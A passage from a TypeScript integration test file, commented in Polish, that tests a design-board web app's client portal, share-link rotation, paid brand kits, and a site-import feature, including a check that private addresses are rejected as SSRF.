      // Klient bez konta widzi portal.
      ;(await client.get(path)).assertStatus(200)

      // Przesłanie pliku z notatką → skrzynka właściciela + mail.
      const sent = await client
        .post(`${path}/materials`)
        .field('name', 'Klient ACME')
        .field('note', 'Nasze nowe logo')
        .file('files[]', await png({ r: 10, g: 20, b: 30 }), {
          filename: 'logo.png',
          contentType: 'image/png',
        })
        .redirects(0)
      sent.assertStatus(302)
      const inbox = await Asset.query().where('board_id', board.id).where('inbox', true)
      assert.lengthOf(inbox, 1)
      assert.equal(inbox[0].submittedBy, 'Klient ACME')
      assert.equal(inbox[0].userNote, 'Nasze nowe logo')
      fake.messages.assertSentCount(1)

      // Ten sam plik ponownie (deduplikacja) nie tworzy nic nowego ani nie nadpisuje notatki.
      ;(
        await client
          .post(`${path}/materials`)
          .field('name', 'Ktoś inny')
          .field('note', 'Inna notatka')
          .file('files[]', await png({ r: 10, g: 20, b: 30 }), {
            filename: 'kopia.png',
            contentType: 'image/png',
          })
          .redirects(0)
      ).assertStatus(302)
      await inbox[0].refresh()
      assert.equal(inbox[0].userNote, 'Nasze nowe logo')
      assert.equal(inbox[0].submittedBy, 'Klient ACME')
      fake.messages.assertSentCount(2)
      assert.equal(
        await PortalFeedback.query()
          .where('board_id', board.id)
          .where('decision', 'note')
          .count('* as n')
          .then((r) => Number(r[0].$extras.n)),
        1
      )

      // Sprzątanie sierot nie usuwa materiałów ze skrzynki.
      await pruneOrphanAssets(board.id)
      assert.lengthOf(await Asset.query().where('board_id', board.id), 1)

      // Właściciel umieszcza materiał na płótnie.
      const accepted = await client
        .post(`/api/assets/${inbox[0].id}/accept`)
        .headers({ cookie: cookies })
      accepted.assertStatus(200)
      assert.isFalse(accepted.body().data.inbox)

      // Akceptacja DESIGN.md.
      await DesignDoc.create({
        boardId: board.id,
        version: 1,
        status: 'ready',
        contentMd: '# Portal',
      })
      ;(
        await client
          .post(`${path}/feedback`)
          .json({ name: 'Klient ACME', decision: 'approved', version: 1 })
          .redirects(0)
      ).assertStatus(302)
      const feedback = await PortalFeedback.query()
        .where('board_id', board.id)
        .where('decision', 'approved')
        .firstOrFail()
      assert.equal(feedback.version, 1)
      fake.messages.assertSentCount(3)

      // Nowy link: stary przestaje działać; wyłączenie: link znika.
      const rotated = await client
        .post(`/api/boards/${board.id}/share/rotate`)
        .headers({ cookie: cookies })
      assert.notEqual(rotated.body().data.url, url)
      ;(await client.get(path)).assertStatus(404)
      const newPath = new URL(rotated.body().data.url).pathname
      ;(
        await client
          .put(`/api/boards/${board.id}/share`)
          .headers({ cookie: cookies })
          .json({ enabled: false })
      ).assertStatus(200)
      ;(await client.get(newPath)).assertStatus(404)
    } finally {
      mail.restore()
    }
  })

  test('brand kity: zapis z DESIGN.md (plan płatny), zmiana nazwy, usunięcie', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user, 'Marka X')
    await seedBoard(client, cookies, board)
    ;(
      await client.post(`/api/boards/${board.id}/design-doc`).headers({ cookie: cookies }).json({})
    ).assertStatus(202)
    await runPendingJobs()

    ;(
      await client.post('/api/brand-kits').headers({ cookie: cookies }).json({ boardId: board.id })
    ).assertStatus(403)
    ;(
      await webhook(client, orderPayload(user, `ord-kit-${user.id}`, VARIANTS.pack_s))
    ).assertStatus(202)

    const created = await client
      .post('/api/brand-kits')
      .headers({ cookie: cookies })
      .json({ boardId: board.id })
    created.assertStatus(201)
    const kit = created.body().data
    assert.isAbove(kit.colors.length, 0)
    assert.match(kit.colors[0].hex, /^#[0-9a-f]{6}$/i)
    assert.equal(kit.sourceVersion, 1)

    const renamed = await client
      .patch(`/api/brand-kits/${kit.id}`)
      .headers({ cookie: cookies })
      .json({ name: 'ACME' })
    assert.equal(renamed.body().data.name, 'ACME')

    // Cudza tablica / cudzy kit.
    const other = await makeUser('kit-other')
    const otherCookies = await login(client, other)
    ;(
      await client
        .patch(`/api/brand-kits/${kit.id}`)
        .headers({ cookie: otherCookies })
        .json({ name: 'x' })
    ).assertStatus(404)

    ;(await client.delete(`/api/brand-kits/${kit.id}`).headers({ cookie: cookies })).assertStatus(
      204
    )
    const list = await client.get('/api/brand-kits').headers({ cookie: cookies })
    assert.lengthOf(list.body().data, 0)
  })

  test('import strony: styl z HTML i CSS, obraz og:image, blokada adresów prywatnych', async ({
    client,
    assert,
  }) => {
    const user = await makeUser()
    const cookies = await login(client, user)
    const board = await createBoard(user)

    // Bez wyjątku testowego adres lokalny jest odrzucany (SSRF).
    const blocked = await client
      .post(`/api/boards/${board.id}/import-site`)
      .headers({ cookie: cookies })
      .json({ url: 'http://127.0.0.1:9/' })
    blocked.assertStatus(422)

    const og = await png({ r: 1, g: 106, b: 113 })
    const server = http.createServer((req, res) => {
      if (req.url === '/style.css') {
        res.writeHead(200, { 'content-type': 'text/css' })
        return res.end(
          ':root{--accent:#c8702a} body{color:#27251e;font-family:"Fraunces",serif} a{color:#c8702a}'
        )
      }
      if (req.url === '/og.png') {
        res.writeHead(200, { 'content-type': 'image/png' })
        return res.end(og)
      }
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
      res.end(`<!doctype html><html><head><title>Ziarno</title><meta name="theme-color" content="#3a2a1f">
        <meta property="og:image" content="/og.png"><link rel="stylesheet" href="/style.css"></head>
        <body><h1>Freshly roasted</h1><h2>Our beans</h2></body></html>`)
    })
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()))
    const port = (server.address() as { port: number }).port
    safeFetchTesting.allowPrivate = true
    try {
      const res = await client
        .post(`/api/boards/${board.id}/import-site`)
        .headers({ cookie: cookies })
        .json({ url: `http://127.0.0.1:${port}/` })
      res.assertStatus(201)
      const { assets, note, summary } = res.body().data
      assert.lengthOf(assets, 2, 'link + obraz og:image')
      assert.equal(assets[0].kind, 'link')
      assert.equal(assets[1].kind, 'image')
      assert.include(note, '#c8702a --accent')
      assert.include(note, 'Theme color: #3a2a1f')
      assert.include(note, 'Fraunces')
      assert.include(note, 'Freshly roasted')
      assert.include(summary.fonts, 'Fraunces')
    } finally {
      safeFetchTesting.allowPrivate = false
      server.close()
    }
  })
})
